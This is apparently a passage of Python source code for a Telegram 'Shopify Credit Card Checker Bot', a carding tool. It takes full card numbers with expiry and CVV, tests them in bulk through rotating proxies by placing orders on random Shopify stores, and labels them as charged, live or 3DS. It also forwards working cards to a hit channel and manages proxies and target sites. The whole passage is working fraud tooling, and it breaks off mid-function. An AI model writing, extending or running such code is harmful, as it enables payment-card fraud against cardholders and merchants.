                    if not user_proxies:
                        break

                    available_proxies = [p for p in user_proxies if p not in tried_proxies]
                    rotated_proxy = random.choice(available_proxies) if available_proxies else random.choice(user_proxies)
                    tried_proxies.add(rotated_proxy)

                    retry_reason = sanitize_for_log(normalize_response_text(response))[:180]
                    logger.info(
                        f"MCHK retry {retry_idx + 1}/{MCHK_LAST_RESPONSE_RETRIES} "
                        f"for user {user_id} with rotated proxy (reason: {retry_reason})"
                    )

                    success, response, gateway, price, currency, receipt_id, order_url = await process_card(
                        cc_data['cc'], cc_data['mes'], cc_data['ano'], cc_data['cvv'],
                        site, user_id, rotated_proxy
                    )

                    if not should_retry_mchk_last_response(success, response):
                        break

            process_time = round(time.time() - start_time, 2)
            
            # Get BIN info
            bin_number = cc_data['cc'][:6]
            bin_info = await get_bin_info(bin_number)
            
            # Prepare result
            result = {
                'user_id': user_id,
                'cc': f"{cc_data['cc']}|{cc_data['mes']}|{cc_data['ano'][-2:]}|{cc_data['cvv']}",
                'full_cc': f"{cc_data['cc']}|{cc_data['mes']}|{cc_data['ano']}|{cc_data['cvv']}",
                'status': success,
                'response': response,
                'gateway': gateway,
                'price': price,
                'currency': currency,
                'site': site,
                'bin_info': bin_info,
                'receipt_id': receipt_id,
                'order_url': order_url,
                'process_time': process_time,
                'message': message,
                'task_type': task_type,
                'task_id': task_id,
                'mchk_show_live_otp': task.get('mchk_show_live_otp', True),
                'mchk_send_captcha_file': task.get('mchk_send_captcha_file', True),
                'batch_id': batch_id
            }
            
            # Put result in queue
            await RESULT_QUEUE.put(result)
            
            TASK_QUEUE.task_done()
            
        except Exception as e:
            logger.error(f"Worker {worker_id} error: {e}")
            if processing_registered and user_id is not None:
                mark_task_done(user_id)
            TASK_QUEUE.task_done()

# Result handler
async def result_handler():
    """Handle results from queue and send to users"""
    logger.info("Result handler started")
    
    while True:
        user_id = None
        try:
            result = await RESULT_QUEUE.get()
            
            user_id = result.get('user_id')
            if user_id is None:
                raise ValueError("Result missing user_id")
            cc = result['cc']
            full_cc = result['full_cc']
            status = result['status']
            response = normalize_response_text(result.get('response'))
            gateway = result['gateway']
            price = result['price']
            currency = result['currency']
            site = result['site']
            bin_info = result['bin_info']
            receipt_id = result.get('receipt_id', '')
            order_url = result.get('order_url', '')
            process_time = result.get('process_time', 0)
            original_message = result.get('message')
            task_type = result.get('task_type', 'single')
            task_id = result.get('task_id')
            mchk_show_live_otp = result.get('mchk_show_live_otp', True)
            mchk_send_captcha_file = result.get('mchk_send_captcha_file', True)
            batch_id = result.get('batch_id')

            if task_type == 'mchk' and batch_id in cancelled_mchk_batches:
                mark_task_done(user_id)
                RESULT_QUEUE.task_done()
                continue
            
            first_name = await get_cached_user_display_name(user_id)
            
            # Determine hit status - FIXED VERSION
            hit_status = "failed"
            
            # Check for HIT status
            if response in ['ORDER_PLACED', 'ProcessedReceipt', 'CHARGED'] or any(k in str(response) for k in success_keys):
                hit_status = "hit"
            # Check for 3DS/OTP status
            elif response in ['OTP_REQUIRED', 'ACTION_REQUIRED', '2FACTOR'] or any(k in str(response) for k in twofactor_keys):
                hit_status = "otp"
            elif "CAPTCHA_REQUIRED" in str(response).upper():
                hit_status = "captcha"
                if task_type == 'mchk' and batch_id and mchk_send_captcha_file:
                    add_batch_captcha_card(batch_id, full_cc)
            # Check for LIVE status
            elif response in ['CCN', 'INCORRECT_CVC', 'INSUFFICIENT_FUNDS'] or any(k in str(response) for k in ccn_keys):
                hit_status = "live"
            
            # Format site name - FIXED to get domain correctly
            site_name = site.replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
            
            # Format receipt with clickable order URL
            receipt_text = ""
            if receipt_id:
                if order_url and order_url != 'N/A' and order_url:
                    safe_order_url = html.escape(str(order_url), quote=True)
                    receipt_text = f"🧾 <a href='{safe_order_url}'>View Order</a>"
                else:
                    receipt_text = f"🧾 Receipt: <code>{html.escape(str(receipt_id))}</code>"
            
            # Format message with click-to-copy card
            if hit_status == "hit":
                status_emoji = "🟢"
                status_text = "HIT"
            elif hit_status == "otp":
                status_emoji = "🟢"
                status_text = "3DS"
            elif hit_status == "live":
                status_emoji = "🟢"
                status_text = "LIVE"
            elif hit_status == "captcha":
                status_emoji = "🟠"
                status_text = "CAPTCHA"
            else:
                status_emoji = "🔴"
                status_text = "DECLINED"
            
            # Format price to 2 decimal places if it's a number
            try:
                formatted_price = round(float(price), 2)
            except (ValueError, TypeError):
                formatted_price = price

            safe_full_cc = html.escape(str(full_cc))
            safe_response = html.escape(str(response))
            safe_bin = html.escape(str(bin_info.get('bin', 'N/A')))
            safe_brand = html.escape(str(bin_info.get('brand', 'UNKNOWN')))
            safe_type = html.escape(str(bin_info.get('type', '')))
            safe_level = html.escape(str(bin_info.get('level', '')))
            safe_bank = html.escape(str(bin_info.get('bank', 'UNKNOWN')))
            safe_country_flag = html.escape(str(bin_info.get('country_flag', '🏳️')))
            safe_country_name = html.escape(str(bin_info.get('country_name', 'UNKNOWN')))
            safe_site_name = html.escape(str(site_name))
            safe_currency = html.escape(str(currency))
            safe_first_name = html.escape(str(first_name))
            
            formatted_message = f"""{status_emoji} {status_text}

💳 Card: <code>{safe_full_cc}</code>
🔐 Code: {safe_response}
🎫 BIN: {safe_bin} [{safe_brand}] {safe_type} ({safe_level}) - {safe_bank}
🌍 Country: {safe_country_flag} {safe_country_name}
🌐 Site: {safe_site_name}
💰 Amount: {formatted_price} {safe_currency}
{receipt_text}
⚡ Time: {process_time}s
👤 User: {safe_first_name}

by @still_alivenow"""
            
            # Send result to user based on task type
            if task_type == 'single':
                # Send all responses for /chk command
                try:
                    await app.send_message(
                        chat_id=user_id,
                        text=formatted_message,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True
                    )
                    if HIT_CHANNEL and hit_status in ['hit', 'live', 'otp']:
                        try:
                            await asyncio.sleep(0.3)
                            await app.send_message(
                                chat_id=HIT_CHANNEL,
                                text=formatted_message,
                                parse_mode=ParseMode.HTML,
                                disable_web_page_preview=True
                            )
                        except Exception as channel_error:
                            logger.error(f"Error forwarding hit to HIT_CHANNEL {HIT_CHANNEL}: {channel_error}")
                except Exception as e:
                    logger.error(f"Error sending message to user {user_id}: {e}")
                    # Fallback to plain text to avoid HTML parsing failures.
                    try:
                        plain_message = re.sub(r"<[^>]+>", "", formatted_message)
                        await app.send_message(
                            chat_id=user_id,
                            text=plain_message,
                            disable_web_page_preview=True
                        )
                    except Exception as send_fallback_error:
                        logger.error(f"Fallback send failed for user {user_id}: {send_fallback_error}")
            
            elif task_type in ['mchk', 'chksite']:
                should_send = hit_status in ['hit', 'live', 'otp']
                if task_type == 'mchk' and not mchk_show_live_otp:
                    should_send = hit_status == 'hit'

                if should_send:
                    try:
                        await app.send_message(
                            chat_id=user_id,
                            text=formatted_message,
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True
                        )
                        if HIT_CHANNEL and hit_status in ['hit', 'live', 'otp']:
                            try:
                                await asyncio.sleep(0.3)
                                await app.send_message(
                                    chat_id=HIT_CHANNEL,
                                    text=formatted_message,
                                    parse_mode=ParseMode.HTML,
                                    disable_web_page_preview=True
                                )
                            except Exception as channel_error:
                                logger.error(f"Error forwarding hit to HIT_CHANNEL {HIT_CHANNEL}: {channel_error}")
                    
                    except Exception as e:
                        logger.error(f"Error sending hit message to user {user_id}: {e}")
                        # Fallback to plain text to avoid HTML parsing failures.
                        try:
                            plain_message = re.sub(r"<[^>]+>", "", formatted_message)
                            await app.send_message(
                                chat_id=user_id,
                                text=plain_message,
                                disable_web_page_preview=True
                            )
                        except Exception as send_fallback_error:
                            logger.error(f"Fallback send failed for mchk user {user_id}: {send_fallback_error}")
            
            # Update progress for batch tasks
            if task_type in ['mchk', 'chksite'] and original_message:
                try:
                    # Initialize stats for this progress message
                    msg_id = original_message.id if hasattr(original_message, 'id') else str(original_message)
                    
                    if msg_id not in task_stats:
                        task_stats[msg_id] = {
                            'total': 1,
                            'checked': 0,
                            'hit': 0,
                            'live': 0,
                            'otp': 0,
                            'captcha': 0,
                            'failed': 0,
                            'start_time': datetime.now(),
                            'last_update_checked': 0,
                            'last_update_at': 0.0
                        }
                        task_messages[msg_id] = original_message
                        task_users[msg_id] = user_id
                    
                    # Update stats
                    task_stats[msg_id]['checked'] += 1
                    if hit_status == 'hit':
                        task_stats[msg_id]['hit'] += 1
                    elif hit_status == 'live':
                        task_stats[msg_id]['live'] += 1
                    elif hit_status == 'otp':
                        task_stats[msg_id]['otp'] += 1
                    elif hit_status == 'captcha':
                        task_stats[msg_id]['captcha'] += 1
                    else:
                        task_stats[msg_id]['failed'] += 1
                    
                    is_complete = task_stats[msg_id]['checked'] >= task_stats[msg_id]['total']
                    if should_update_progress(task_stats[msg_id], force=is_complete):
                        await update_task_progress(msg_id, task_stats[msg_id])
                    
                    if is_complete:
                        if task_type == 'mchk' and batch_id and mchk_send_captcha_file:
                            await send_batch_captcha_file(user_id, batch_id)
                        # Keep stats for a while then clean up
                        asyncio.create_task(cleanup_task_data(msg_id, delay=300))
                        if task_type == 'mchk' and batch_id:
                            finalize_mchk_batch(batch_id)
                            
                except Exception as e:
                    logger.error(f"Error updating progress: {e}")
            
            mark_task_done(user_id)
            
            RESULT_QUEUE.task_done()
            
        except Exception as e:
            logger.error(f"Result handler error: {e}")
            if user_id is not None:
                mark_task_done(user_id)
            RESULT_QUEUE.task_done()

async def cleanup_task_data(msg_id, delay=300):
    """Clean up task data after delay"""
    await asyncio.sleep(delay)
    stats = task_stats.pop(msg_id, None)
    task_messages.pop(msg_id, None)
    task_users.pop(msg_id, None)
    if isinstance(stats, dict):
        batch_id = stats.get('batch_id')
        if batch_id:
            finalize_mchk_batch(batch_id)

async def safe_callback_answer(callback_query: CallbackQuery, text: str = "", show_alert: bool = False):
    """Answer callback safely (ignore expired/invalid callback id)."""
    try:
        if text:
            await callback_query.answer(text, show_alert=show_alert)
        else:
            await callback_query.answer()
    except Exception as e:
        if "QUERY_ID_INVALID" in str(e).upper():
            return
        logger.error(f"Callback answer error: {e}")

# Callback query handler
@app.on_callback_query()
async def handle_callback(client, callback_query: CallbackQuery):
    """Handle callback queries from inline buttons"""
    data = callback_query.data or ""

    if data.startswith("mchk_pref:"):
        try:
            _, choice_token, pref_id = data.split(":", 2)
        except ValueError:
            await safe_callback_answer(callback_query, "Invalid selection", show_alert=True)
            return

        session = mchk_pref_sessions.get(pref_id)
        if not session:
            await safe_callback_answer(callback_query, "This selection has expired", show_alert=True)
            return

        user = callback_query.from_user
        if not user or user.id != session.get('user_id'):
            await safe_callback_answer(callback_query, "This button is not for you", show_alert=True)
            return

        choice = 'yes' if choice_token == 'y' else 'no'
        session['choice'] = choice
        session['event'].set()

        choice_text = "Yes (HIT + LIVE + 3DS)" if choice == 'yes' else "No (HIT only)"
        await safe_callback_answer(callback_query, f"Selected: {choice_text}")

        try:
            await callback_query.message.edit_reply_markup(reply_markup=None)
        except Exception:
            pass
        return

    if data.startswith("mchk_captcha_pref:"):
        try:
            _, choice_token, pref_id = data.split(":", 2)
        except ValueError:
            await safe_callback_answer(callback_query, "Invalid selection", show_alert=True)
            return

        session = mchk_captcha_pref_sessions.get(pref_id)
        if not session:
            await safe_callback_answer(callback_query, "This selection has expired", show_alert=True)
            return

        user = callback_query.from_user
        if not user or user.id != session.get('user_id'):
            await safe_callback_answer(callback_query, "This button is not for you", show_alert=True)
            return

        choice = 'yes' if choice_token == 'y' else 'no'
        session['choice'] = choice
        session['event'].set()

        choice_text = "Yes (send CAPTCHA txt)" if choice == 'yes' else "No"
        await safe_callback_answer(callback_query, f"Selected: {choice_text}")

        try:
            await callback_query.message.edit_reply_markup(reply_markup=None)
        except Exception:
            pass
        return

    if data.startswith("stopmchk_batch:"):
        batch_id = data.split(":", 1)[1].strip()
        user = callback_query.from_user
        if not user:
            await safe_callback_answer(callback_query, "User not found", show_alert=True)
            return

        cancel_info = cancel_user_mchk_batches(user.id, batch_ids=[batch_id])
        cancelled_batches = cancel_info.get('cancelled_batches', [])
        removed_pending = cancel_info.get('removed_pending', 0)
        msg_ids = set(cancel_info.get('msg_ids', []))

        if not cancelled_batches:
            await safe_callback_answer(callback_query, "Batch already stopped or finished", show_alert=True)
            return

        for msg_id in msg_ids:
            progress_msg = task_messages.get(msg_id)
            if not progress_msg:
                continue
            stats = task_stats.get(msg_id, {})
            checked = stats.get('checked', 0)
            total = stats.get('total', 0)
            try:
                await progress_msg.edit_text(
                    f"⛔ MASS CHECK STOPPED\n\nChecked: {checked}/{total}\nPending removed: {removed_pending}",
                    disable_web_page_preview=True
                )
            except Exception:
                pass
            asyncio.create_task(cleanup_task_data(msg_id, delay=10))

        await safe_callback_answer(callback_query, f"Stopped batch. Removed pending: {removed_pending}")
        return

    await safe_callback_answer(callback_query)  # Just acknowledge the callback

# Database functions
async def init_db():
    """Initialize database collections and indexes"""
    global DB_AVAILABLE
    try:
        # Users collection indexes
        await users_col.create_index('user_id', unique=True)
        
        # Proxies collection indexes
        await proxies_col.create_index([('user_id', 1), ('proxy', 1)], unique=True)
        
        # Sites collection indexes
        await sites_col.create_index('url', unique=True)
        
        # User sites collection indexes
        await user_sites_col.create_index([('user_id', 1), ('sites.url', 1)])
        
        logger.info("Database initialized successfully")
        DB_AVAILABLE = True
    except Exception as e:
        set_db_unavailable(e)
        logger.error(f"Database initialization error: {e}")
        logger.warning("Running with in-memory fallback storage (data will not persist across restarts).")

async def get_user_proxies(user_id):
    """Get all proxies for a user"""
    if DB_AVAILABLE:
        try:
            cursor = proxies_col.find({'user_id': user_id})
            proxies = await cursor.to_list(length=None)
            proxy_values = [p['proxy'] for p in proxies if p.get('proxy')]
            if proxy_values:
                mem_user_proxies[user_id].update(proxy_values)
            return proxy_values
        except Exception as e:
            set_db_unavailable(e)
    return list(mem_user_proxies.get(user_id, set()))

async def add_user_proxy(user_id, proxy):
    """Add a proxy for a user"""
    try:
        if DB_AVAILABLE:
            try:
                await proxies_col.update_one(
                    {'user_id': user_id, 'proxy': proxy},
                    {'$set': {'user_id': user_id, 'proxy': proxy, 'added_at': utcnow()}},
                    upsert=True
                )
            except Exception as db_error:
                set_db_unavailable(db_error)
        mem_user_proxies[user_id].add(proxy)
        return True
    except Exception as e:
        logger.error(f"Error adding proxy: {e}")
        return False

async def delete_user_proxy(user_id, proxy=None):
    """Delete proxy(s) for a user"""
    try:
        if proxy:
            deleted = False
            if DB_AVAILABLE:
                try:
                    result = await proxies_col.delete_one({'user_id': user_id, 'proxy': proxy})
                    deleted = result.deleted_count > 0
                except Exception as db_error:
                    set_db_unavailable(db_error)
            if proxy in mem_user_proxies.get(user_id, set()):
                mem_user_proxies[user_id].discard(proxy)
                deleted = True
            if user_id in mem_user_proxies and not mem_user_proxies[user_id]:
                mem_user_proxies.pop(user_id, None)
            return deleted
        else:
            deleted = False
            if DB_AVAILABLE:
                try:
                    result = await proxies_col.delete_many({'user_id': user_id})
                    deleted = result.deleted_count > 0
                except Exception as db_error:
                    set_db_unavailable(db_error)
            if user_id in mem_user_proxies and mem_user_proxies[user_id]:
                deleted = True
            mem_user_proxies.pop(user_id, None)
            return deleted
    except Exception as e:
        logger.error(f"Error deleting proxy: {e}")
        return False

async def get_all_proxies():
    """Get all proxies from all users"""
    if DB_AVAILABLE:
        try:
            cursor = proxies_col.find({})
            proxies = await cursor.to_list(length=None)
            for p in proxies:
                uid = p.get('user_id')
                proxy = p.get('proxy')
                if uid is not None and proxy:
                    mem_user_proxies[uid].add(proxy)
            return proxies
        except Exception as e:
            set_db_unavailable(e)

    all_proxies = []
    for uid, proxy_set in mem_user_proxies.items():
        for proxy in proxy_set:
            all_proxies.append({'user_id': uid, 'proxy': proxy})
    return all_proxies

async def get_user_sites(user_id):
    """Get all working sites for a user"""
    user_sites = None
    if DB_AVAILABLE:
        try:
            user_sites = await user_sites_col.find_one({'user_id': user_id})
        except Exception as e:
            set_db_unavailable(e)
            user_sites = None

    if user_sites and 'sites' in user_sites:
        raw_sites = [dict(site) if isinstance(site, dict) else {'url': str(site)} for site in user_sites.get('sites', [])]
    else:
        raw_sites = mem_user_sites.get(user_id, [])

    filtered_sites, removed_count = filter_sites_by_price_range(raw_sites)
    mem_user_sites[user_id] = filtered_sites

    if removed_count > 0 and DB_AVAILABLE:
        try:
            await user_sites_col.update_one(
                {'user_id': user_id},
                {'$set': {'user_id': user_id, 'sites': filtered_sites}},
                upsert=True
            )
        except Exception as e:
            set_db_unavailable(e)

    return [site.get('url') for site in filtered_sites if site.get('url')]

async def get_user_sites_doc(user_id):
    """Get full user sites doc, with memory fallback."""
    user_sites = None
    if DB_AVAILABLE:
        try:
            user_sites = await user_sites_col.find_one({'user_id': user_id})
        except Exception as e:
            set_db_unavailable(e)
            user_sites = None

    if user_sites and 'sites' in user_sites:
        raw_sites = [dict(site) if isinstance(site, dict) else {'url': str(site)} for site in user_sites.get('sites', [])]
    else:
        raw_sites = mem_user_sites.get(user_id, [])

    filtered_sites, removed_count = filter_sites_by_price_range(raw_sites)
    mem_user_sites[user_id] = filtered_sites

    if removed_count > 0 and DB_AVAILABLE:
        try:
            await user_sites_col.update_one(
                {'user_id': user_id},
                {'$set': {'user_id': user_id, 'sites': filtered_sites}},
                upsert=True
            )
        except Exception as e:
            set_db_unavailable(e)

    if not filtered_sites:
        return None
    return {'user_id': user_id, 'sites': filtered_sites}

async def replace_user_sites(user_id, sites):
    """Replace user sites list in storage."""
    normalized_sites = [dict(site) if isinstance(site, dict) else {'url': str(site)} for site in sites]
    mem_user_sites[user_id] = normalized_sites
    if DB_AVAILABLE:
        try:
            await user_sites_col.update_one(
                {'user_id': user_id},
                {'$set': {'user_id': user_id, 'sites': normalized_sites}},
                upsert=True
            )
        except Exception as e:
            set_db_unavailable(e)

async def get_all_user_site_docs():
    """Get all user site docs."""
    if DB_AVAILABLE:
        try:
            cursor = user_sites_col.find({})
            docs = await cursor.to_list(length=None)
            for doc in docs:
                uid = doc.get('user_id')
                if uid is None:
                    continue
                mem_user_sites[uid] = [
                    dict(site) if isinstance(site, dict) else {'url': str(site)}
                    for site in doc.get('sites', [])
                ]
            return docs
        except Exception as e:
            set_db_unavailable(e)
    return get_memory_all_user_site_docs()

async def get_all_sites():
    """Get all global sites"""
    if DB_AVAILABLE:
        try:
            cursor = sites_col.find({})
            sites = await cursor.to_list(length=None)
            urls = [s['url'] for s in sites if s.get('url')]
            if urls:
                mem_global_sites.update(urls)
            return urls
        except Exception as e:
            set_db_unavailable(e)
    return list(mem_global_sites)

async def add_global_site(site_url):
    """Add a site to global sites"""
    try:
        site_url = normalize_site_url(site_url)
        # Check global site limit
        current_count = len(mem_global_sites)
        if DB_AVAILABLE:
            try:
                current_count = await sites_col.count_documents({})
            except Exception as db_error:
                set_db_unavailable(db_error)

        if current_count >= MAX_GLOBAL_SITES:
            return False, f"Maximum global site limit reached ({MAX_GLOBAL_SITES})"

        if DB_AVAILABLE:
            try:
                await sites_col.update_one(
                    {'url': site_url},
                    {'$set': {'url': site_url, 'added_at': utcnow()}},
                    upsert=True
                )
            except Exception as db_error:
                set_db_unavailable(db_error)

        mem_global_sites.add(site_url)
        return True, "Site added successfully"
    except Exception as e:
        logger.error(f"Error adding global site: {e}")
        return False, str(e)

async def delete_global_site(site_url=None):
    """Delete global site(s)"""
    try:
        if site_url:
            site_url = normalize_site_url(site_url)
            deleted = False
            if DB_AVAILABLE:
                try:
                    result = await sites_col.delete_one({'url': site_url})
                    deleted = result.deleted_count > 0
                except Exception as db_error:
                    set_db_unavailable(db_error)
            if site_url in mem_global_sites:
                mem_global_sites.discard(site_url)
                deleted = True
            return deleted
        else:
            deleted = False
            if DB_AVAILABLE:
                try:
                    result = await sites_col.delete_many({})
                    deleted = result.deleted_count > 0
                except Exception as db_error:
                    set_db_unavailable(db_error)
            if mem_global_sites:
                deleted = True
            mem_global_sites.clear()
            return deleted
    except Exception as e:
        logger.error(f"Error deleting global site: {e}")
        return False

async def get_random_site(user_id):
    """Get a random working site for user, fallback to global sites"""
    # Try user's working sites first
    user_sites = await get_user_sites(user_id)
    if user_sites:
        return random.choice(user_sites)
    
    # Fallback to global sites
    global_sites = await get_all_sites()
    if global_sites:
        return random.choice(global_sites)
    
    return None

async def save_user(user_id, first_name, username=None):
    """Save or update user in database"""
    user_name_cache[user_id] = first_name
    user_display_cache[user_id] = f"@{username}" if username else (first_name or 'User')
    now_ts = utcnow()
    existing_mem = mem_users.get(user_id, {})
    mem_users[user_id] = {
        'user_id': user_id,
        'first_name': first_name,
        'username': username,
        'last_seen': now_ts,
        'joined_at': existing_mem.get('joined_at', now_ts),
        'total_checks': existing_mem.get('total_checks', 0)
    }

    try:
        if DB_AVAILABLE:
            await users_col.update_one(
                {'user_id': user_id},
                {
                    '$set': {
                        'first_name': first_name,
                        'username': username,
                        'last_seen': now_ts
                    },
                    '$setOnInsert': {
                        'joined_at': now_ts,
                        'total_checks': 0
                    }
                },
                upsert=True
            )
    except Exception as e:
        set_db_unavailable(e)
        logger.error(f"Error saving user: {e}")

async def increment_user_checks_bulk(user_id, amount):
    """Increment user's total checks count by amount."""
    if amount <= 0:
        return
    mem_users.setdefault(user_id, {
        'user_id': user_id,
        'first_name': user_name_cache.get(user_id, 'User'),
        'username': None,
        'joined_at': utcnow(),
        'last_seen': utcnow(),
        'total_checks': 0
    })
    mem_users[user_id]['total_checks'] = mem_users[user_id].get('total_checks', 0) + amount
    try:
        if DB_AVAILABLE:
            await users_col.update_one(
                {'user_id': user_id},
                {'$inc': {'total_checks': amount}}
            )
    except Exception as e:
        set_db_unavailable(e)
        logger.error(f"Error incrementing user checks by {amount}: {e}")

async def increment_user_checks(user_id):
    """Increment user's total checks count."""
    await increment_user_checks_bulk(user_id, 1)

async def get_user_stats(user_id):
    """Get user statistics"""
    user = None
    proxy_count = len(mem_user_proxies.get(user_id, set()))
    sites_count = len(mem_user_sites.get(user_id, []))

    if DB_AVAILABLE:
        try:
            user = await users_col.find_one({'user_id': user_id})
            if user:
                mem_users[user_id] = {
                    'user_id': user_id,
                    'first_name': user.get('first_name', 'Unknown'),
                    'username': user.get('username'),
                    'joined_at': user.get('joined_at'),
                    'last_seen': user.get('last_seen'),
                    'total_checks': user.get('total_checks', 0)
                }
            proxy_count = await proxies_col.count_documents({'user_id': user_id})
            sites_count = len(await get_user_sites(user_id))
        except Exception as e:
            set_db_unavailable(e)

    if not user:
        user = get_memory_user_doc(user_id)
    if not user:
        return None

    active_task_stats = get_active_task_stats(user_id)
    
    return {
        'user_id': user_id,
        'first_name': user.get('first_name', 'Unknown'),
        'username': user.get('username'),
        'joined_at': user.get('joined_at'),
        'last_seen': user.get('last_seen'),
        'total_checks': user.get('total_checks', 0),
        'proxy_count': proxy_count,
        'sites_count': sites_count,
        'active_tasks': active_task_stats['active_total'],
        'active_queued': active_task_stats['active_queued'],
        'active_processing': active_task_stats['active_processing']
    }

# Bot commands
@app.on_message(filters.command('start'))
async def start_command(client, message):
    """Start command handler"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    welcome_text = f"""👋 Welcome {user.first_name}!

I'm a Shopify Credit Card Checker Bot. Here are my commands:

🔹 <b>Single Check</b>
/chk CC|MM|YYYY|CVV - Check a single card (all responses sent)

🔹 <b>Mass Check</b>
/mchk - Send up to {MAX_MASS_CHECK_CARDS} cards (one per line) or reply to a .txt file
/stopmchk - Stop your current mass check batch
/clean - Reply to a txt/message to clean CCs (one per line output txt)

🔹 <b>Site Checker</b>
/chksite - Test sites and get working ones (reply to .txt file with sites)

🔹 <b>Proxy Management</b>
/addproxy - Add proxies (one per line) or reply to .txt
/delproxy - Delete all your proxies
/showproxy - Show your saved proxies

🔹 <b>Site Management</b>
/addsite [site] - Check site and get cheapest product
/showsites - Show all your working sites
/rmvsite - Remove sites from your list

🔹 <b>Info</b>
/stats - Show your statistics

<b>Admin Only Commands:</b>
/loadsite - Add global sites (max {MAX_GLOBAL_SITES})
/delsite - Delete global sites

Bot automatically selects random sites from your working sites or global sites.
Dead sites are automatically removed."""

    await message.reply_text(welcome_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

@app.on_message(filters.command('chk') & filters.private)
async def chk_command(client, message):
    """Single card check command"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Check if command has arguments or is reply
    if len(message.command) > 1:
        cc_string = message.command[1]
    elif message.reply_to_message and message.reply_to_message.text:
        cc_string = message.reply_to_message.text.strip()
    else:
        await message.reply_text("❌ Please provide a card in format: CC|MM|YYYY|CVV", disable_web_page_preview=True)
        return
    
    # Parse CC
    try:
        cc_parts = parse_cc_string(cc_string)
    except ValueError as e:
        await message.reply_text(f"❌ {str(e)}", disable_web_page_preview=True)
        return
    
    # Get user's proxy
    user_proxies = await get_user_proxies(user.id)
    proxy = random.choice(user_proxies) if user_proxies else None
    
    # Get random site
    site = await get_random_site(user.id)
    if not site:
        await message.reply_text("❌ No sites available! Please ask admin to add sites.", disable_web_page_preview=True)
        return
    
    # Send processing message
    processing_msg = await message.reply_text(
        f"🔄 Processing card...\n"
        f"💳 Card: {cc_parts['cc']}\n"
        f"🌐 Site: {site}\n"
        f"🔌 Proxy: {'Yes' if proxy else 'No'}",
        disable_web_page_preview=True
    )
    
    # Generate task ID
    task_id = f"{user.id}_{int(time.time() * 1000)}_{random.randint(1000, 9999)}"
    task_payload = {
        'user_id': user.id,
        'cc_data': cc_parts,
        'site': site,
        'proxy': proxy,
        'message': processing_msg,
        'type': 'single',
        'task_id': task_id
    }
    queued_ok, queue_msg = enqueue_user_task(task_payload)
    if not queued_ok:
        await processing_msg.edit_text(f"❌ {queue_msg}", disable_web_page_preview=True)
        return

    register_queued_tasks(user.id, 1)
    
    await increment_user_checks(user.id)

@app.on_message(filters.command('mchk') & filters.private)
async def mchk_command(client, message):
    """Mass card check command (up to MAX_MASS_CHECK_CARDS cards)"""
    user = message.from_user
    await save_user(user.id, user.first_name, user.username)
    
    # Get cards from command or reply
    cards = []
    if len(message.command) > 1:
        # Cards from command arguments
        cards_text = ' '.join(message.command[1:])
        cards = [line.strip() for line in cards_text.split('\n') if line.strip()]
    elif message.reply_to_message:
        if message.reply_to_message.document:
            # Handle file upload
            file = await message.reply_to_message.download()
            async with aiofiles.open(file, 'r') as f:
                content = await f.read()
                cards = [line.strip() for line in content.split('\n') if line.strip()]
            os.remove(file)
        elif message.reply_to_message.text:
            # Handle text reply
            cards = [line.strip() for line in message.reply_to_message.text.split('\n') if line.strip()]
    
    if not cards:
        await message.reply_text(
            f"❌ Please provide cards (one per line, max {MAX_MASS_CHECK_CARDS})",
            disable_web_page_preview=True
        )
        return
    
    if len(cards) > MAX_MASS_CHECK_CARDS:
        await message.reply_text(
            f"❌ Too many cards: {len(cards)}\nMax allowed: {MAX_MASS_CHECK_CARDS}",
            disable_web_page_preview=True
        )
        return
    
    # Validate cards
    valid_cards = []
    invalid_cards = []
    for card in cards:
        try:
            cc_parts = parse_cc_string(card)
            valid_cards.append(cc_parts)
        except ValueError:
            invalid_cards.append(card)
    
    if not valid_cards:
        await message.reply_text("❌ No valid cards found in input", disable_web_page_preview=True)
        return
    
    # Get user's proxies
    user_proxies = await get_user_proxies(user.id)
    
    # Get user's sites
    user_sites = await get_user_sites(user.id)
    if not user_sites:
        global_sites = await get_all_sites()
        if not global_sites:
            await message.reply_text("❌ No sites available! Please ask admin to add sites.", disable_web_page_preview=True)
            return
        site_pool = global_sites
    else:
        site_pool = user_sites

    capacity = get_user_enqueue_capacity(user.id)
    if capacity <= 0:
        await message.reply_text(
            "❌ System is busy right now. Try again in a moment.",
            disable_web_page_preview=True
        )
        return

    accepted_cards = valid_cards[:capacity]
    dropped_for_capacity = max(0, len(valid_cards) - len(accepted_cards))

    # Ask user how to deliver approved results
    pref_id = hashlib.md5(
        f"{user.id}:{time.time_ns()}:{random.random()}".encode()
    ).hexdigest()[:12]
    pref_event = asyncio.Event()
    mchk_pref_sessions[pref_id] = {
        'user_id': user.id,
        'choice': None,
        'event': pref_event,
        'created_at': time.time()
    }

    pref_text = (
        "Do you want Approved CC in txt?\n"
        "Choose Yes to receive Approved CCs in chat.\n\n"
        "Choose No to only receive Charged CC."
    )
    pref_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Yes", callback_data=f"mchk_pref:y:{pref_id}")],
        [InlineKeyboardButton("No", callback_data=f"mchk_pref:n:{pref_id}")]
    ])
    pref_message = await message.reply_text(
        pref_text,
        reply_markup=pref_keyboard,
        disable_web_page_preview=True
    )

    send_live_otp = False
    try:
        await asyncio.wait_for(pref_event.wait(), timeout=60)
        selected_choice = mchk_pref_sessions.get(pref_id, {}).get('choice', 'no')
        send_live_otp = selected_choice == 'yes'
    except asyncio.TimeoutError:
        send_live_otp = False
    finally:
        mchk_pref_sessions.pop(pref_id, None)

    selected_text = "Yes (HIT + LIVE + 3DS)" if send_live_otp else "No (HIT only)"
    try:
        await pref_message.edit_text(
            f"{pref_text}\n\n✅ Selected: {selected_text}",
            disable_web_page_preview=True
        )
    except Exception:
        pass

    # Ask user whether to send CAPTCHA_REQUIRED cards as txt after completion
    captcha_pref_id = hashlib.md5(
        f"captcha:{user.id}:{time.time_ns()}:{random.random()}".encode()
    ).hexdigest()[:12]
    captcha_pref_event = asyncio.Event()
    mchk_captcha_pref_sessions[captcha_pref_id] = {
        'user_id': user.id,
        'choice': None,
        'event': captcha_pref_event,
        'created_at': time.time()
    }

    captcha_pref_text = (
        "Send CAPTCHA_REQUIRED cards as txt file when mass check completes?"
    )
    captcha_pref_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Yes", callback_data=f"mchk_captcha_pref:y:{captcha_pref_id}")],
